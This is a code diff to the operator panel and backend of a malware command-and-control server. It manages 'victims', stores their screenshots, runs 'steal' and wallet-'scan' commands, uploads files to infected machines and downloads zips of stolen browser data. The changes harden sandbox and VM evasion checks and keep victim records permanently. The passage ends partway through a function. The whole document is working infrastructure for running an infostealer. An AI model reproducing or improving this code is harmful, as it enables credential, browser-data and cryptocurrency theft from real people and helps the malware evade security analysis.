@@ -69,11 +69,12 @@ def get_db():
     conn = sqlite3.connect('virtuals_c2.db')
     c = conn.cursor()
     
-    # Victims table
+    # Victims table - NEVER delete victims, just mark status
     c.execute('''CREATE TABLE IF NOT EXISTS victims (
         id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, 
         is_vm INTEGER DEFAULT 0, vm_details TEXT, first_seen TEXT, last_seen TEXT,
-        activity TEXT DEFAULT 'idle', browser_data_stolen INTEGER DEFAULT 0
+        activity TEXT DEFAULT 'idle', browser_data_stolen INTEGER DEFAULT 0,
+        user_type TEXT DEFAULT 'real'
     )''')
     
     # Commands table
@@ -107,7 +108,7 @@ def get_db():
         timestamp TEXT, success INTEGER DEFAULT 1
     )''')
     
-    # Screenshots table - FIXED: Added missing table
+    # Screenshots table
     c.execute('''CREATE TABLE IF NOT EXISTS screenshots (
         id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, filename TEXT,
         timestamp TEXT, FOREIGN KEY (victim_id) REFERENCES victims(id)
@@ -122,7 +123,7 @@ def get_db():
     return conn
 
 # ============================================
-# HEARTBEAT CLEANER
+# HEARTBEAT CLEANER - Only marks offline, NEVER deletes
 # ============================================
 def cleanup_heartbeats():
     while True:
@@ -130,8 +131,9 @@ def cleanup_heartbeats():
         try:
             conn = get_db()
             c = conn.cursor()
-            cutoff = datetime.datetime.now() - datetime.timedelta(seconds=20)
-            c.execute("UPDATE victims SET status = 'Offline' WHERE last_seen < ? AND status = 'Online'",
+            cutoff = datetime.datetime.now() - datetime.timedelta(seconds=30)
+            # Only mark as offline, NEVER delete victims
+            c.execute("UPDATE victims SET status = 'Offline', activity = 'offline' WHERE last_seen < ? AND status = 'Online'",
                      (cutoff.strftime("%Y-%m-%d %H:%M:%S"),))
             conn.commit()
             conn.close()
@@ -141,7 +143,7 @@ def cleanup_heartbeats():
 threading.Thread(target=cleanup_heartbeats, daemon=True).start()
 
 # ============================================
-# VM DETECTION
+# VM DETECTION - Just marks, never bricks automatically
 # ============================================
 class VMDetector:
     @staticmethod
@@ -156,19 +158,21 @@ class VMDetector:
             'disk': VMDetector.check_disk()
         }
         hits = sum(1 for v in checks.values() if v)
-        return {'is_vm': hits >= 4, 'confidence': min(100, int((hits / 7) * 100)), 'safe_mode': True}
+        return {'is_vm': hits >= 2, 'confidence': min(100, int((hits / 7) * 100)), 'safe_mode': True, 'checks': checks}
     
     @staticmethod
     def check_registry():
         try:
             import winreg
-            indicators = ['VMware', 'VirtualBox', 'QEMU', 'Hyper-V']
-            keys = [(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemManufacturer")]
+            indicators = ['VMware', 'VirtualBox', 'QEMU', 'Hyper-V', 'Parallels']
+            keys = [(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemManufacturer"),
+                    (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName")]
             for hkey, subkey, value in keys:
                 try:
                     key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ)
                     val, _ = winreg.QueryValueEx(key, value)
-                    return any(i.lower() in str(val).lower() for i in indicators)
+                    if any(i.lower() in str(val).lower() for i in indicators):
+                        return True
                 except:
                     pass
         except:
@@ -178,7 +182,7 @@ class VMDetector:
     @staticmethod
     def check_processes():
         try:
-            procs = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe']
+            procs = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe', 'qemu-ga.exe']
             for p in procs:
                 try:
                     r = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {p}'], 
@@ -195,14 +199,16 @@ class VMDetector:
     def check_hardware():
         try:
             cpu = platform.processor()
-            return cpu and any(x in cpu.lower() for x in ['virtual', 'vmware', 'qemu'])
+            return cpu and any(x in cpu.lower() for x in ['virtual', 'vmware', 'qemu', 'parallels'])
         except:
             return False
     
     @staticmethod
     def check_files():
         try:
-            files = ['C:\\Program Files\\VMware\\VMware Tools\\', 'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\']
+            files = ['C:\\Program Files\\VMware\\VMware Tools\\', 
+                     'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\',
+                     'C:\\Windows\\vmmem.sys']
             return any(os.path.exists(f) for f in files)
         except:
             return False
@@ -211,7 +217,7 @@ class VMDetector:
     def check_memory():
         try:
             import psutil
-            return psutil.virtual_memory().total / (1024**3) < 4
+            return psutil.virtual_memory().total / (1024**3) < 3
         except:
             return False
     
@@ -219,7 +225,7 @@ class VMDetector:
     def check_network():
         try:
             mac = uuid.getnode()
-            prefixes = ['000569', '000c29', '001c42', '005056', '080027']
+            prefixes = ['000569', '000c29', '001c42', '005056', '080027', '00155d']
             return any(p in format(mac, '012x') for p in prefixes)
         except:
             return False
@@ -230,7 +236,7 @@ class VMDetector:
             import psutil
             for p in psutil.disk_partitions():
                 if p.mountpoint in ('C:\\', '/'):
-                    return psutil.disk_usage(p.mountpoint).total / (1024**3) < 50
+                    return psutil.disk_usage(p.mountpoint).total / (1024**3) < 60
         except:
             return False
 
@@ -387,17 +393,20 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .notification-dropdown .notif-item .notif-content{color:#8888a0;font-size:11px;margin-top:1px}
 .notification-dropdown .notif-item .notif-time{color:#555568;font-size:9px;margin-top:1px}
 /* OWNER PANEL */
-.owner-panel{position:fixed;top:50px;right:10px;width:350px;max-height:calc(100vh - 70px);background:rgba(10,10,18,0.95);backdrop-filter:blur(20px);border:1px solid rgba(255,215,0,0.2);border-radius:10px;padding:12px;overflow-y:auto;display:none;z-index:1000;box-shadow:0 10px 40px rgba(0,0,0,0.8)}
-.owner-panel .panel-title{color:#ffd700;font-size:14px;font-weight:600;border-bottom:1px solid rgba(255,215,0,0.1);padding-bottom:8px;margin-bottom:8px}
-.owner-panel .section-title{color:#8888a0;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-top:10px;margin-bottom:5px}
-.owner-panel .item{display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px}
-.owner-panel .item .label{color:#8888a0}
-.owner-panel .item .value{color:#e8e8f0}
+.owner-panel{position:fixed;top:50px;right:10px;width:380px;max-height:calc(100vh - 70px);background:rgba(10,10,18,0.98);backdrop-filter:blur(20px);border:1px solid rgba(255,215,0,0.3);border-radius:10px;padding:15px;overflow-y:auto;display:none;z-index:1000;box-shadow:0 10px 40px rgba(0,0,0,0.9)}
+.owner-panel .panel-title{color:#ffd700;font-size:16px;font-weight:600;border-bottom:1px solid rgba(255,215,0,0.2);padding-bottom:10px;margin-bottom:10px}
+.owner-panel .section-title{color:#8888a0;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-top:15px;margin-bottom:8px;font-weight:600}
+.owner-panel .item{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:12px;align-items:center}
+.owner-panel .item .label{color:#8888a0;flex:1}
+.owner-panel .item .value{color:#e8e8f0;text-align:right}
 .owner-panel .item .value.online{color:#66dd88}
 .owner-panel .item .value.offline{color:#886666}
-.owner-panel .item .value.admin{color:#ffd700}
-.owner-panel .close-btn{float:right;color:#8888a0;cursor:pointer;font-size:16px;transition:0.3s}
+.owner-panel .item .value.admin{color:#ffd700;font-weight:600}
+.owner-panel .close-btn{float:right;color:#8888a0;cursor:pointer;font-size:18px;transition:0.3s;margin-top:-5px}
 .owner-panel .close-btn:hover{color:#e8e8f0}
+.owner-panel .empty-msg{color:#555568;font-size:12px;font-style:italic;padding:5px 0}
+.owner-panel .refresh-btn{background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.2);padding:4px 12px;border-radius:4px;cursor:pointer;font-size:11px;margin-top:10px;width:100%}
+.owner-panel .refresh-btn:hover{background:rgba(255,215,0,0.2)}
 .container{display:flex;height:calc(100vh - 46px);padding:5px;gap:5px;position:relative;z-index:1}
 .channels-panel{width:170px;min-width:170px;display:flex;flex-direction:column;gap:4px;height:100%}
 .channels-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;padding:5px 8px;border-bottom:1px solid rgba(255,255,255,0.04);flex-shrink:0}
@@ -408,9 +417,11 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .channel-item .status-dot{width:6px;height:6px;border-radius:50%;margin-right:6px;flex-shrink:0}
 .channel-item .status-dot.online{background:#44dd88;animation:pulse 2s infinite}
 .channel-item .status-dot.offline{background:#664444}
+.channel-item .status-dot.vm{background:#ffaa44}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
 .channel-item .name{color:#e8e8f0;font-size:12px;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .channel-item .badge{background:rgba(200,60,60,0.12);color:#cc8888;font-size:7px;padding:0 5px;border-radius:6px;line-height:13px;height:13px;flex-shrink:0;margin-left:4px}
+.channel-item .badge.vm{background:rgba(255,170,68,0.2);color:#ffaa44}
 .channel-item .activity{color:#666680;font-size:8px;margin-left:4px;font-style:italic;flex-shrink:0}
 .middle-panel{flex:1;display:flex;flex-direction:column;gap:5px;min-width:200px;height:100%}
 .chat-panel{padding:6px 10px;flex:1;display:flex;flex-direction:column;min-height:0}
@@ -505,12 +516,17 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 <div class="panel-title">◈ OWNER PANEL</div>
 <span class="close-btn" onclick="toggleOwnerPanel()">✕</span>
 </div>
-<div class="section-title">Active Users</div>
-<div id="activeUsers"><div style="color:#555568;font-size:12px;">Loading...</div></div>
-<div class="section-title">Login Logs</div>
-<div id="loginLogs"><div style="color:#555568;font-size:12px;">Loading...</div></div>
+<div class="section-title">Active Users (Last Hour)</div>
+<div id="activeUsers"><div class="empty-msg">Loading...</div></div>
+<div class="section-title">All System Users</div>
+<div id="allUsers"><div class="empty-msg">Loading...</div></div>
+<div class="section-title">Login Logs (Last 20)</div>
+<div id="loginLogs"><div class="empty-msg">Loading...</div></div>
 <div class="section-title">Commands By User</div>
-<div id="commandStats"><div style="color:#555568;font-size:12px;">Loading...</div></div>
+<div id="commandStats"><div class="empty-msg">Loading...</div></div>
+<div class="section-title">System Stats</div>
+<div id="systemStats"><div class="empty-msg">Loading...</div></div>
+<button class="refresh-btn" onclick="refreshOwnerPanel()">↻ Refresh Data</button>
 </div>
 <div class="container">
 <div class="channels-panel glass">
@@ -522,7 +538,7 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 <div class="middle-panel">
 <div class="chat-panel glass">
 <div class="panel-title">CONSOLE <span class="channel-name" id="currentChannel">#general</span></div>
-<div class="chat-messages" id="chatMessages"><div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready</div></div>
+<div class="chat-messages" id="chatMessages"><div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready - victims persist even when offline</div></div>
 <div class="chat-input-area"><input id="chatInput" placeholder="/command or message" onkeypress="if(event.key==='Enter')sendMessage()"><button onclick="sendMessage()">send</button></div>
 <div class="file-upload-area">
 <input type="file" id="fileInput" onchange="document.getElementById('fileName').textContent=this.files[0]?this.files[0].name:'no file'">
@@ -555,30 +571,426 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 let state={channels:{},activeChannel:'general',commands:{},cmdCount:0,notifications:[],isOwner:false};
 let currentUser = 'admin';
 
-// Get current user from session
-function getUserInfo(){fetch('/api/get_user').then(r=>r.json()).then(d=>{if(d.success){document.getElementById('currentUser').textContent=d.username;currentUser=d.username;if(d.role==='owner'){document.getElementById('ownerIcon').style.display='inline-block';state.isOwner=true;}}});}
-function logout(){fetch('/api/logout',{method:'POST'}).then(()=>window.location.href='/');}
-function api(a,d,c){fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a,...d})}).then(r=>r.json()).then(c).catch(()=>{});}
-function refresh(){api('getVictims',{},d=>{if(d.success){state.channels=d.victims;renderChannels();updateStats();}});if(state.isOwner){refreshOwnerPanel();}}
-function renderChannels(){const el=document.getElementById('channelList');const v=Object.values(state.channels);if(v.length===0){el.innerHTML='<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No channels</div>';return;}el.innerHTML=v.map(v=>`<div class="channel-item ${state.activeChannel===v.id?'active':''}" onclick="selectChannel('${v.id}')"><span class="status-dot ${v.status==='Online'?'online':'offline'}"></span><span class="name">${v.id}</span>${v.is_vm?'<span class="badge">VM</span>':''}<span class="activity">${v.activity||'idle'}</span></div>`).join('');}
-function selectChannel(id){state.activeChannel=id;document.getElementById('currentChannel').textContent='#'+id;renderChannels();showDetails(id);loadScreenshots(id);}
-function showDetails(id){const v=state.channels[id];if(!v)return;document.getElementById('victimDetails').innerHTML=`<div class="detail-item"><span class="label">ID</span><span class="value">${v.id}</span></div><div class="detail-item"><span class="label">PC</span><span class="value">${v.pc}</span></div><div class="detail-item"><span class="label">IP</span><span class="value">${v.ip}</span></div><div class="detail-item"><span class="label">OS</span><span class="value">${v.os||'unknown'}</span></div><div class="detail-item"><span class="label">Status</span><span class="value ${v.status==='Online'?'online':'offline'}">${v.status}</span></div><div class="detail-item"><span class="label">VM</span><span class="value" style="color:${v.is_vm?'#cc8888':'#66dd88'}">${v.is_vm?'detected':'clean'}</span></div><div class="detail-item"><span class="label">Commands</span><span class="value">${(state.commands[id]||[]).length}</span></div><div class="detail-item"><span class="label">Browser Data</span><span class="value" style="color:${v.browser_data_stolen?'#66dd88':'#886666'}">${v.browser_data_stolen?'stolen':'waiting'}</span></div>`;}
-function loadScreenshots(id){api('getScreenshots',{victim_id:id},d=>{const el=document.getElementById('screenshotGallery');if(!d.success||!d.screenshots||d.screenshots.length===0){el.innerHTML='<div style="color:#555568;font-size:10px;">none</div>';return;}el.innerHTML=d.screenshots.map(s=>`<div class="screenshot-thumb" onclick="window.open('/screenshots/${s.filename}','_blank')">📷</div>`).join('');});}
-function updateStats(){const v=Object.values(state.channels);document.getElementById('channelCount').textContent=v.length;document.getElementById('onlineCount').textContent=v.filter(x=>x.status==='Online').length;document.getElementById('vmCount').textContent=v.filter(x=>x.is_vm).length;}
-function addLog(type,content){const el=document.getElementById('logOutput');let cls='system';if(type==='success')cls='success';else if(type==='failed')cls='failed';else if(type==='info')cls='info';const time=new Date().toLocaleTimeString();el.innerHTML='<div class="log-item"><span class="log-time">['+time+']</span><span class="type '+cls+'">'+type+'</span><span class="log-content">'+content+'</span></div>'+el.innerHTML;if(el.children.length>80){el.removeChild(el.lastChild);}}
-function addNotification(title,content){state.notifications.unshift({title,content,time:new Date().toLocaleTimeString()});updateNotifications();}
-function updateNotifications(){const list=document.getElementById('notifList');const badge=document.getElementById('notifBadge');if(state.notifications.length===0){list.innerHTML='<div style="color:#555568;font-size:11px;padding:8px;text-align:center;">No notifications</div>';badge.style.display='none';return;}badge.style.display='inline-block';badge.textContent=state.notifications.length;list.innerHTML=state.notifications.map(n=>`<div class="notif-item"><div class="notif-title">${n.title}</div><div class="notif-content">${n.content}</div><div class="notif-time">${n.time}</div></div>`).join('');}
-function toggleNotifications(){const dd=document.getElementById('notifDropdown');dd.style.display=dd.style.display==='block'?'none':'block';}
-function toggleOwnerPanel(){const p=document.getElementById('ownerPanel');if(p.style.display==='block'){p.style.display='none';}else{p.style.display='block';refreshOwnerPanel();}}
-function refreshOwnerPanel(){if(!state.isOwner)return;api('getOwnerData',{},d=>{if(d.success){const users=document.getElementById('activeUsers');users.innerHTML=d.active_users.map(u=>`<div class="item"><span class="label">${u.username}</span><span class="value ${u.role==='owner'?'admin':''}">${u.role}${u.role==='owner'?' 👑':''}</span></div>`).join('')||'<div style="color:#555568;font-size:12px;">No active users</div>';const logs=document.getElementById('loginLogs');logs.innerHTML=d.login_logs.map(l=>`<div class="item"><span class="label">${l.username}</span><span class="value">${l.ip} - ${l.time}</span></div>`).join('')||'<div style="color:#555568;font-size:12px;">No login logs</div>';const stats=document.getElementById('commandStats');stats.innerHTML=d.command_stats.map(s=>`<div class="item"><span class="label">${s.username}</span><span class="value">${s.count} commands</span></div>`).join('')||'<div style="color:#555568;font-size:12px;">No commands yet</div>';}});}
-function addMessage(sender,msg,type){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();let cls='system';if(type==='us')cls='us';else if(type==='victim')cls='victim';else if(type==='embed')cls='embed';else if(type==='user')cls='user';else if(type==='wallet')cls='wallet';else if(type==='file')cls='file';el.innerHTML+='<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';el.scrollTop=el.scrollHeight;}
-function sendCommand(cmd){const channel=state.activeChannel;if(!channel){addMessage('system','no channel selected','system');addLog('failed','No channel selected');return;}addMessage('us','/'+cmd+' → '+channel,'us');addLog('info','Executing '+cmd+' on '+channel);api('sendCommand',{victim_id:channel,command:cmd},d=>{if(d.success){if(!state.commands[channel])state.commands[channel]=[];state.commands[channel].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;addMessage('us','success','us');addLog('success','Command '+cmd+' completed');addNotification('Command Executed',cmd+' on '+channel);if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{addMessage('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('info',w.currency+': '+w.balance);});addNotification('Scan Complete',d.wallets.length+' wallets found');}if(d.embed){addEmbed(d.embed);addLog('info',d.embed.title);}if(cmd==='steal'){addNotification('Browser Data Stolen','Data stolen');}showDetails(channel);updateStats();}else{addMessage('us','failed','us');addLog('failed','Command '+cmd+' failed');addNotification('Command Failed',cmd+' failed');}});}
-function addEmbed(embed){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();el.innerHTML+=`<div class="msg"><span class="time">[${t}]</span><div class="embed-box" style="--embed-color:${embed.color||'#44aaff'}"><div class="embed-title">${embed.title}</div><div class="embed-content">${embed.content}</div><div class="embed-footer">${embed.footer||''}</div></div></div>`;el.scrollTop=el.scrollHeight;}
-function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';const channel=state.activeChannel;if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!channel){addMessage('system','no channel selected','system');addLog('failed','No channel selected');return;}addMessage(currentUser,msg,'user');addMessage('victim',msg,'victim');addLog('info','Message sent to '+channel);}}
-function uploadFile(){const channel=state.activeChannel;if(!channel){addMessage('system','select a channel','system');addLog('failed','No channel selected');return;}const input=document.getElementById('fileInput');if(!input.files||!input.files[0]){addMessage('system','select a file','system');addLog('failed','No file selected');return;}const file=input.files[0];const fd=new FormData();fd.append('file',file);fd.append('victim_id',channel);const p=document.getElementById('uploadProgress');const b=document.getElementById('progressBar');p.style.display='block';b.style.width='0%';addMessage('us','uploading '+file.name,'us');addLog('info','Uploading '+file.name);let iv=setInterval(()=>{const cur=parseFloat(b.style.width)||0;if(cur<90){b.style.width=(cur+15)+'%';}},150);fetch('/upload-file',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);if(d.success){addMessage('file','uploaded','file');addLog('success','File uploaded');addNotification('File Uploaded',file.name);}else{addMessage('system','failed','system');addLog('failed','Upload failed');addNotification('Upload Failed',file.name);}}).catch(()=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);addMessage('system','failed','system');addLog('failed','Upload error');addNotification('Upload Failed','Connection error');});}
-function downloadBrowserZip(){const channel=state.activeChannel||'all';window.open('/download-browser-zip?victim_id='+channel,'_blank');addNotification('Browser Zip Downloaded','Users Browser Zip for '+channel);}
-function loadDemo(){if(Object.keys(state.channels).length===0){const f=[{id:'TEST-BOT-01',pc:'TEST-BOT-01',ip:'192.168.1.10',os:'Windows 10 Pro',status:'Online',is_vm:0,activity:'idle',browser_data_stolen:1},{id:'TEST-BOT-02',pc:'TEST-BOT-02',ip:'192.168.1.11',os:'Windows 11 Pro',status:'Online',is_vm:0,activity:'typing',browser_data_stolen:0},{id:'TEST-BOT-03',pc:'TEST-BOT-03',ip:'192.168.1.12',os:'Windows 10 Pro',status:'Online',is_vm:1,activity:'reading',browser_data_stolen:1}];f.forEach(v=>{state.channels[v.id]=v;});renderChannels();updateStats();addMessage('system','Test Bots loaded','system');addLog('system','3 test bots online');selectChannel(f[0].id);addNotification('System Ready','3 test bots connected');}}
-setInterval(refresh,5000);refresh();getUserInfo();setTimeout(loadDemo,500);
+function getUserInfo(){
+    fetch('/api/get_user')
+        .then(r=>r.json())
+        .then(d=>{
+            if(d.success){
+                document.getElementById('currentUser').textContent=d.username;
+                currentUser=d.username;
+                if(d.role==='owner'){
+                    document.getElementById('ownerIcon').style.display='inline-block';
+                    state.isOwner=true;
+                    console.log('[OWNER] Panel activated');
+                }
+            }
+        })
+        .catch(e=>console.error('Auth error:',e));
+}
+
+function logout(){
+    fetch('/api/logout',{method:'POST'})
+        .then(()=>window.location.href='/');
+}
+
+function api(a,d,c){
+    fetch('/api',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({action:a,...d})
+    })
+    .then(r=>r.json())
+    .then(c)
+    .catch(err=>{
+        console.error('API Error:',a,err);
+        if(c) c({success:false,error:err});
+    });
+}
+
+function refresh(){
+    api('getVictims',{},d=>{
+        if(d.success){
+            state.channels=d.victims;
+            renderChannels();
+            updateStats();
+        }
+    });
+}
+
+function renderChannels(){
+    const el=document.getElementById('channelList');
+    const v=Object.values(state.channels);
+    if(v.length===0){
+        el.innerHTML='<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No channels</div>';
+        return;
+    }
+    el.innerHTML=v.map(v=>{
+        const isVm = v.is_vm ? '<span class="badge vm">VM</span>' : '';
+        const statusClass = v.is_vm ? 'vm' : (v.status==='Online'?'online':'offline');
+        return `<div class="channel-item ${state.activeChannel===v.id?'active':''}" onclick="selectChannel('${v.id}')">
+            <span class="status-dot ${statusClass}"></span>
+            <span class="name">${v.id}</span>
+            ${isVm}
+            <span class="activity">${v.activity||'idle'}</span>
+        </div>`;
+    }).join('');
+}
+
+function selectChannel(id){
+    state.activeChannel=id;
+    document.getElementById('currentChannel').textContent='#'+id;
+    renderChannels();
+    showDetails(id);
+    loadScreenshots(id);
+}
+
+function showDetails(id){
+    const v=state.channels[id];
+    if(!v)return;
+    const vmStatus = v.is_vm ? 
+        `<span style="color:#ffaa44">VM DETECTED (${v.vm_details||'unknown'})</span>` : 
+        '<span style="color:#66dd88">Clean System</span>';
+    
+    document.getElementById('victimDetails').innerHTML=`
+        <div class="detail-item"><span class="label">ID</span><span class="value">${v.id}</span></div>
+        <div class="detail-item"><span class="label">PC</span><span class="value">${v.pc}</span></div>
+        <div class="detail-item"><span class="label">IP</span><span class="value">${v.ip}</span></div>
+        <div class="detail-item"><span class="label">OS</span><span class="value">${v.os||'unknown'}</span></div>
+        <div class="detail-item"><span class="label">Status</span><span class="value ${v.status==='Online'?'online':'offline'}">${v.status}</span></div>
+        <div class="detail-item"><span class="label">VM Check</span><span class="value">${vmStatus}</span></div>
+        <div class="detail-item"><span class="label">Commands</span><span class="value">${(state.commands[id]||[]).length}</span></div>
+        <div class="detail-item"><span class="label">Browser Data</span><span class="value" style="color:${v.browser_data_stolen?'#66dd88':'#886666'}">${v.browser_data_stolen?'stolen':'waiting'}</span></div>
+        <div class="detail-item"><span class="label">First Seen</span><span class="value" style="font-size:10px">${v.first_seen||'unknown'}</span></div>
+        <div class="detail-item"><span class="label">Last Seen</span><span class="value" style="font-size:10px">${v.last_seen||'unknown'}</span></div>
+    `;
+}
+
+function loadScreenshots(id){
+    api('getScreenshots',{victim_id:id},d=>{
+        const el=document.getElementById('screenshotGallery');
+        if(!d.success||!d.screenshots||d.screenshots.length===0){
+            el.innerHTML='<div style="color:#555568;font-size:10px;">none</div>';
+            return;
+        }
+        el.innerHTML=d.screenshots.map(s=>`<div class="screenshot-thumb" onclick="window.open('/screenshots/${s.filename}','_blank')">📷</div>`).join('');
+    });
+}
+
+function updateStats(){
+    const v=Object.values(state.channels);
+    document.getElementById('channelCount').textContent=v.length;
+    document.getElementById('onlineCount').textContent=v.filter(x=>x.status==='Online').length;
+    document.getElementById('vmCount').textContent=v.filter(x=>x.is_vm).length;
+}
+
+function addLog(type,content){
+    const el=document.getElementById('logOutput');
+    let cls='system';
+    if(type==='success')cls='success';
+    else if(type==='failed')cls='failed';
+    else if(type==='info')cls='info';
+    const time=new Date().toLocaleTimeString();
+    el.innerHTML='<div class="log-item"><span class="log-time">['+time+']</span><span class="type '+cls+'">'+type+'</span><span class="log-content">'+content+'</span></div>'+el.innerHTML;
+    if(el.children.length>80){
+        el.removeChild(el.lastChild);
+    }
+}
+
+function addNotification(title,content){
+    state.notifications.unshift({title,content,time:new Date().toLocaleTimeString()});
+    updateNotifications();
+}
+
+function updateNotifications(){
+    const list=document.getElementById('notifList');
+    const badge=document.getElementById('notifBadge');
+    if(state.notifications.length===0){
+        list.innerHTML='<div style="color:#555568;font-size:11px;padding:8px;text-align:center;">No notifications</div>';
+        badge.style.display='none';
+        return;
+    }
+    badge.style.display='inline-block';
+    badge.textContent=state.notifications.length;
+    list.innerHTML=state.notifications.map(n=>`<div class="notif-item"><div class="notif-title">${n.title}</div><div class="notif-content">${n.content}</div><div class="notif-time">${n.time}</div></div>`).join('');
+}
+
+function toggleNotifications(){
+    const dd=document.getElementById('notifDropdown');
+    dd.style.display=dd.style.display==='block'?'none':'block';
+}
+
+function toggleOwnerPanel(){
+    const p=document.getElementById('ownerPanel');
+    if(p.style.display==='block'){
+        p.style.display='none';
+    }else{
+        p.style.display='block';
+        refreshOwnerPanel();
+    }
+}
+
+function refreshOwnerPanel(){
+    if(!state.isOwner){
+        console.log('Not owner, skipping panel refresh');
+        return;
+    }
+    
+    console.log('[OWNER] Refreshing panel data...');
+    
+    api('getOwnerData',{},d=>{
+        console.log('[OWNER] Data received:',d);
+        
+        if(!d.success){
+            console.error('Owner data failed:',d.error);
+            document.getElementById('activeUsers').innerHTML='<div class="empty-msg">Error loading data</div>';
+            return;
+        }
+        
+        // Active users (last hour)
+        const usersEl=document.getElementById('activeUsers');
+        if(d.active_users&&d.active_users.length>0){
+            usersEl.innerHTML=d.active_users.map(u=>`<div class="item">
+                <span class="label">${u.username}</span>
+                <span class="value ${u.role==='owner'?'admin':''}">${u.role}${u.role==='owner'?' 👑':''}</span>
+            </div>`).join('');
+        }else{
+            usersEl.innerHTML='<div class="empty-msg">No active sessions</div>';
+        }
+        
+        // All users
+        const allUsersEl=document.getElementById('allUsers');
+        if(d.all_users&&d.all_users.length>0){
+            allUsersEl.innerHTML=d.all_users.map(u=>`<div class="item">
+                <span class="label">${u.username}</span>
+                <span class="value ${u.role==='owner'?'admin':''}">${u.role} | Last: ${u.last_login||'never'}</span>
+            </div>`).join('');
+        }else{
+            allUsersEl.innerHTML='<div class="empty-msg">No users found</div>';
+        }
+        
+        // Login logs
+        const logsEl=document.getElementById('loginLogs');
+        if(d.login_logs&&d.login_logs.length>0){
+            logsEl.innerHTML=d.login_logs.map(l=>`<div class="item">
+                <span class="label">${l.username}</span>
+                <span class="value" style="font-size:10px">${l.ip} | ${l.time}</span>
+            </div>`).join('');
+        }else{
+            logsEl.innerHTML='<div class="empty-msg">No recent logins</div>';
+        }
+        
+        // Command stats
+        const statsEl=document.getElementById('commandStats');
+        if(d.command_stats&&d.command_stats.length>0){
+            statsEl.innerHTML=d.command_stats.map(s=>`<div class="item">
+                <span class="label">${s.username}</span>
+                <span class="value">${s.count} commands</span>
+            </div>`).join('');
+        }else{
+            statsEl.innerHTML='<div class="empty-msg">No commands executed</div>';
+        }
+        
+        // System stats
+        const sysEl=document.getElementById('systemStats');
+        if(d.system_stats){
+            sysEl.innerHTML=`<div class="item"><span class="label">Total Victims</span><span class="value">${d.system_stats.total_victims}</span></div>
+            <div class="item"><span class="label">Online Now</span><span class="value online">${d.system_stats.online_now}</span></div>
+            <div class="item"><span class="label">VMs Detected</span><span class="value" style="color:#ffaa44">${d.system_stats.vm_count}</span></div>
+            <div class="item"><span class="label">Total Commands</span><span class="value">${d.system_stats.total_commands}</span></div>`;
+        }else{
+            sysEl.innerHTML='<div class="empty-msg">Stats unavailable</div>';
+        }
+    });
+}
+
+function addMessage(sender,msg,type){
+    const el=document.getElementById('chatMessages');
+    const t=new Date().toLocaleTimeString();
+    let cls='system';
+    if(type==='us')cls='us';
+    else if(type==='victim')cls='victim';
+    else if(type==='embed')cls='embed';
+    else if(type==='user')cls='user';
+    else if(type==='wallet')cls='wallet';
+    else if(type==='file')cls='file';
+    el.innerHTML+='<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';
+    el.scrollTop=el.scrollHeight;
+}
+
+function sendCommand(cmd){
+    const channel=state.activeChannel;
+    if(!channel){
+        addMessage('system','no channel selected','system');
+        addLog('failed','No channel selected');
+        return;
+    }
+    addMessage('us','/'+cmd+' → '+channel,'us');
+    addLog('info','Executing '+cmd+' on '+channel);
+    
+    api('sendCommand',{victim_id:channel,command:cmd},d=>{
+        if(d.success){
+            if(!state.commands[channel])state.commands[channel]=[];
+            state.commands[channel].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});
+            state.cmdCount++;
+            addMessage('us','success','us');
+            addLog('success','Command '+cmd+' completed');
